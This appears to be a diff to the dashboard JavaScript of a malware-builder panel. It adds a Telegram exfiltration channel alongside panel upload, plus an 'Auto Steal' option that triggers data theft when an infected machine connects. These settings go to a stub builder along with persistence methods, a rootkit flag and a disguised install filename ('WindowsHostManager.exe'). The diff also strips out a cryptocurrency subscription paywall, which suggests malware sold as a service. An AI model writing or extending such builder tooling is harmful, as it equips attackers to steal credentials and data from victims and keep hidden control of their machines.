@@ -194,8 +194,6 @@ document.querySelectorAll('.nav-btn').forEach(btn => {
             const userKeyInput = document.getElementById('build-user-key');
             if (targetUrlInput) targetUrlInput.value = window.location.origin + '/api/upload';
             if (userKeyInput) userKeyInput.value = currentUser?.api_key || 'Loading...';
-        } else if (tabName === 'billing') {
-            loadBillingTab();
         } else if (tabName === 'settings') {
             loadSettings();
             loadProfileUI();
@@ -205,11 +203,20 @@ document.querySelectorAll('.nav-btn').forEach(btn => {
     });
 });
 
-// Builder Delivery Form Toggle (hidden, PANEL default)
-const buildDeliveryHidden = document.getElementById('build-delivery-hidden');
-if (buildDeliveryHidden) {
-    buildDeliveryHidden.value = 'PANEL';
-}
+// Builder Delivery Form Toggle
+const buildDeliveryRadios = document.querySelectorAll('input[name="build-delivery"]');
+buildDeliveryRadios.forEach(radio => {
+    radio.addEventListener('change', (e) => {
+        const value = e.target.value;
+        if (value === 'TELEGRAM') {
+            document.getElementById('build-tg-fields').style.display = 'block';
+            document.getElementById('build-panel-fields').style.display = 'none';
+        } else if (value === 'PANEL') {
+            document.getElementById('build-tg-fields').style.display = 'none';
+            document.getElementById('build-panel-fields').style.display = 'block';
+        }
+    });
+});
 
 // Theme Selectors
 document.querySelectorAll('.theme-selector').forEach(sel => {
@@ -359,10 +366,6 @@ window.addEventListener('DOMContentLoaded', async () => {
             return;
         }
         currentUser = data.user;
-        if (!currentUser.is_admin && !currentUser.has_subscription) {
-            window.location.href = '/billing';
-            return;
-        }
         initAuthUI();
     } catch (e) {
         window.location.href = '/login';
@@ -1365,6 +1368,7 @@ document.getElementById('save-settings-btn').addEventListener('click', async () 
 (function() {
     const toggle = document.getElementById('persistence-toggle');
     const dropdown = document.getElementById('persistence-dropdown');
+    const wrapper = toggle ? toggle.closest('.persistence-select-wrapper') : null;
     const label = document.getElementById('persistence-label');
     const noneCheck = document.getElementById('persist-none');
     const methodChecks = dropdown.querySelectorAll('input[type="checkbox"]:not(#persist-none)');
@@ -1372,9 +1376,18 @@ document.getElementById('save-settings-btn').addEventListener('click', async () 
     toggle.addEventListener('click', (e) => {
         e.stopPropagation();
         dropdown.classList.toggle('open');
+        // Increase z-index when open to be on top
+        if (wrapper) wrapper.style.zIndex = dropdown.classList.contains('open') ? '1000' : '10';
     });
 
-    document.addEventListener('click', () => dropdown.classList.remove('open'));
+    // Close only this dropdown when clicking outside
+    document.addEventListener('click', (e) => {
+        if (!toggle.contains(e.target) && !dropdown.contains(e.target)) {
+            dropdown.classList.remove('open');
+            if (wrapper) wrapper.style.zIndex = '10';
+        }
+    });
+
     dropdown.addEventListener('click', (e) => e.stopPropagation());
 
     noneCheck.addEventListener('change', () => {
@@ -1404,6 +1417,54 @@ document.getElementById('save-settings-btn').addEventListener('click', async () 
     }
 })();
 
+// Auto Steal dropdown handler
+(function() {
+    const toggle = document.getElementById('autosteal-toggle');
+    const dropdown = document.getElementById('autosteal-dropdown');
+    const wrapper = toggle ? toggle.closest('.persistence-select-wrapper') : null;
+    const label = document.getElementById('autosteal-label');
+    const neverCheck = document.getElementById('autosteal-never');
+    const firstCheck = document.getElementById('autosteal-first');
+    const alwaysCheck = document.getElementById('autosteal-always');
+    const allChecks = [neverCheck, firstCheck, alwaysCheck];
+
+    if (!toggle || !dropdown || !wrapper) return;
+
+    toggle.addEventListener('click', (e) => {
+        e.stopPropagation();
+        dropdown.classList.toggle('open');
+        // Increase z-index when open to be on top
+        wrapper.style.zIndex = dropdown.classList.contains('open') ? '1000' : '10';
+    });
+
+    // Close only this dropdown when clicking outside
+    document.addEventListener('click', (e) => {
+        if (!toggle.contains(e.target) && !dropdown.contains(e.target)) {
+            dropdown.classList.remove('open');
+            wrapper.style.zIndex = '10';
+        }
+    });
+
+    dropdown.addEventListener('click', (e) => e.stopPropagation());
+
+    allChecks.forEach(check => {
+        check.addEventListener('change', () => {
+            if (check.checked) {
+                // Uncheck others
+                allChecks.forEach(c => { if (c !== check) c.checked = false; });
+
+                // Update label
+                if (check === neverCheck) label.textContent = 'Never (Manual Only)';
+                else if (check === firstCheck) label.textContent = 'On First Connect';
+                else if (check === alwaysCheck) label.textContent = 'Every Connect';
+            } else {
+                // Don't allow unchecking all - default to never
+                check.checked = true;
+            }
+        });
+    });
+})();
+
 document.getElementById('btn-build-stub').addEventListener('click', async () => {
     const consoleBox = document.getElementById('build-console');
     consoleBox.innerHTML = '';
@@ -1416,9 +1477,12 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
         consoleBox.scrollTop = consoleBox.scrollHeight;
     };
 
-    const delivery = 'PANEL';
-    const botToken = '';
-    const chatId = '';
+    const deliveryRadio = document.querySelector('input[name="build-delivery"]:checked');
+    const delivery = deliveryRadio ? deliveryRadio.value : 'PANEL';
+    const botTokenEl = document.getElementById('build-tg-token');
+    const chatIdEl = document.getElementById('build-tg-chat');
+    const botToken = botTokenEl ? botTokenEl.value.trim() : '';
+    const chatId = chatIdEl ? chatIdEl.value.trim() : '';
     const panelUrl = window.location.origin + '/api/upload';
     const secretKey = currentUser.api_key || '';
 
@@ -1430,6 +1494,22 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
     const installName   = document.getElementById('build-install-name').value.trim() || 'WindowsHostManager.exe';
     const debugMode     = false;
     const rootkitMode   = false;
+
+    // Auto steal - only one can be checked
+    const autoStealNever = document.getElementById('autosteal-never');
+    const autoStealFirst = document.getElementById('autosteal-first');
+    const autoStealAlways = document.getElementById('autosteal-always');
+    let autoSteal = 'never';
+    if (autoStealFirst && autoStealFirst.checked) autoSteal = 'first';
+    else if (autoStealAlways && autoStealAlways.checked) autoSteal = 'always';
+
+    // Validation
+    if (delivery === 'TELEGRAM') {
+        if (!botToken || !chatId) {
+            log('Error: Telegram Bot Token and Chat ID are required!', 'error');
+            return;
+        }
+    }
     if (installName.length > 31) {
         log('Error: Install filename exceeds 31 characters!', 'error');
         return;
@@ -1447,7 +1527,7 @@ document.getElementById('btn-build-stub').addEventListener('click', async () => 
         const res = await fetch('/api/build', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence, installFolder, installName, debugMode, rootkitMode })
+            body: JSON.stringify({ delivery, botToken, chatId, panelUrl, secretKey, persistence, installFolder, installName, debugMode, rootkitMode, autoSteal })
         });
 
         const data = await res.json();
@@ -1746,142 +1826,6 @@ function formatBytes(bytes) {
 
     observer.observe(document.body, { childList: true, subtree: true });
 })();
-
-// ── BILLING ──────────────────────────────────────────────────────────────────
-
-async function loadBillingTab() {
-    const statusCard = document.getElementById('billing-status-card');
-    const tiersEl = document.getElementById('billing-tiers');
-    const planPrice = document.getElementById('plan-price-display');
-    const planDuration = document.getElementById('plan-duration-display');
-    const payBtn = document.getElementById('btn-create-invoice');
-    const msgEl = document.getElementById('billing-msg');
-    const invoiceBox = document.getElementById('billing-invoice-link');
-    const invoiceUrl = document.getElementById('billing-invoice-url');
-
-    let tiers = {};
-    let selectedMonths = 1;
-
-    function formatPrice(n) {
-        return parseFloat(n).toFixed(2);
-    }
-
-    function renderTiers() {
-        tiersEl.innerHTML = '';
-        Object.entries(tiers).forEach(([months, t]) => {
-            const el = document.createElement('div');
-            el.style.cssText = 'display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.03);cursor:pointer;transition:all 0.18s ease;';
-            if (parseInt(months) === selectedMonths) {
-                el.style.borderColor = 'var(--primary)';
-                el.style.background = 'rgba(230,194,68,0.1)';
-            }
-            el.innerHTML = `
-                <div style="display:flex;flex-direction:column;gap:3px;">
-                    <div style="font-weight:600;font-size:13px;">${t.label}</div>
-                    <div style="font-size:11px;color:var(--text-muted);">${t.days} days</div>
-                </div>
-                <div style="display:flex;align-items:center;gap:8px;">
-                    ${t.discount > 0 ? `<span style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;padding:3px 6px;border-radius:5px;background:rgba(16,185,129,0.15);color:var(--accent-green);">-${t.discount}%</span>` : ''}
-                    <div style="font-size:18px;font-weight:800;letter-spacing:-0.5px;">$${formatPrice(t.price)} <span style="font-size:11px;font-weight:500;color:var(--text-muted);">USDT</span></div>
-                </div>
-            `;
-            el.addEventListener('click', () => {
-                selectedMonths = parseInt(months);
-                Array.from(tiersEl.children).forEach(c => {
-                    c.style.borderColor = 'rgba(255,255,255,0.08)';
-                    c.style.background = 'rgba(255,255,255,0.03)';
-                });
-                el.style.borderColor = 'var(--primary)';
-                el.style.background = 'rgba(230,194,68,0.1)';
-                updatePlanDisplay();
-                updatePayButton();
-            });
-            tiersEl.appendChild(el);
-        });
-    }
-
-    function updatePlanDisplay() {
-        const t = tiers[selectedMonths];
-        if (!t) return;
-        planPrice.textContent = formatPrice(t.price);
-        planDuration.textContent = `${t.days} days`;
-    }
-
-    function updatePayButton() {
-        const t = tiers[selectedMonths];
-        if (!t) return;
-        payBtn.textContent = `Pay $${formatPrice(t.price)} USDT`;
-        payBtn.disabled = false;
-    }
-
-    function showMsg(text, type) {
-        msgEl.textContent = text;
-        msgEl.style.display = 'block';
-        msgEl.style.background = type === 'success' ? 'rgba(16,185,129,0.1)' : 'rgba(244,63,94,0.1)';
-        msgEl.style.border = type === 'success' ? '1px solid rgba(16,185,129,0.25)' : '1px solid rgba(244,63,94,0.25)';
-        msgEl.style.color = type === 'success' ? '#10b981' : '#f43f5e';
-    }
-
-    try {
-        const res = await fetch('/api/billing/status');
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Failed to load billing status');
-
-        tiers = data.tiers || { 1: { price: 5, days: 30, label: '1 month', discount: 0 } };
-        renderTiers();
-        updatePlanDisplay();
-        updatePayButton();
-
-        if (data.is_admin) {
-            statusCard.innerHTML = '<div style="display:flex;align-items:center;gap:10px;"><span style="width:10px;height:10px;border-radius:50%;background:var(--primary)"></span><div><div style="font-weight:600;">Administrator</div><div style="font-size:12px;color:var(--text-muted);">Unlimited access. No subscription required.</div></div></div>';
-            payBtn.textContent = 'No payment needed';
-            payBtn.disabled = true;
-            tiersEl.style.display = 'none';
-            return;
-        }
-
-        if (data.has_subscription) {
-            const exp = data.subscription_expires ? new Date(data.subscription_expires) : null;
-            statusCard.innerHTML = `<div style="display:flex;align-items:center;gap:10px;"><span style="width:10px;height:10px;border-radius:50%;background:var(--accent-green)"></span><div><div style="font-weight:600;">Active</div><div style="font-size:12px;color:var(--text-muted);">Expires: ${exp ? exp.toLocaleString() : '—'}</div></div></div>`;
-        } else {
-            statusCard.innerHTML = '<div style="display:flex;align-items:center;gap:10px;"><span style="width:10px;height:10px;border-radius:50%;background:var(--accent-red)"></span><div><div style="font-weight:600;">Expired / Inactive</div><div style="font-size:12px;color:var(--text-muted);">Subscribe to access the panel.</div></div></div>';
-        }
-
-        payBtn.onclick = async () => {
-            msgEl.style.display = 'none';
-            invoiceBox.style.display = 'none';
-            payBtn.disabled = true;
-            const oldText = payBtn.textContent;
-            payBtn.textContent = 'Creating invoice...';
-            try {
-                const res = await fetch('/api/billing/invoice', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ months: selectedMonths })
-                });
-                const data = await res.json();
-                if (!res.ok) throw new Error(data.error || 'Invoice creation failed');
-
-                // Open CryptoBot payment immediately
-                window.open(data.pay_url, '_blank');
-
-                invoiceUrl.href = data.pay_url;
-                invoiceBox.style.display = 'block';
-                showMsg('Payment window opened. Complete payment in CryptoBot.', 'success');
-                payBtn.textContent = 'Invoice ready';
-            } catch (err) {
-                showMsg(err.message, 'error');
-                payBtn.textContent = oldText;
-                payBtn.disabled = false;
-            }
-        };
-    } catch (err) {
-        statusCard.innerHTML = `<p class="empty-state" style="color:var(--accent-red)">${escapeHtml(err.message)}</p>`;
-        payBtn.textContent = 'Retry';
-        payBtn.disabled = false;
-        payBtn.onclick = loadBillingTab;
-    }
-}
 
 // ── HUB ──────────────────────────────────────────────────────────────────────
 
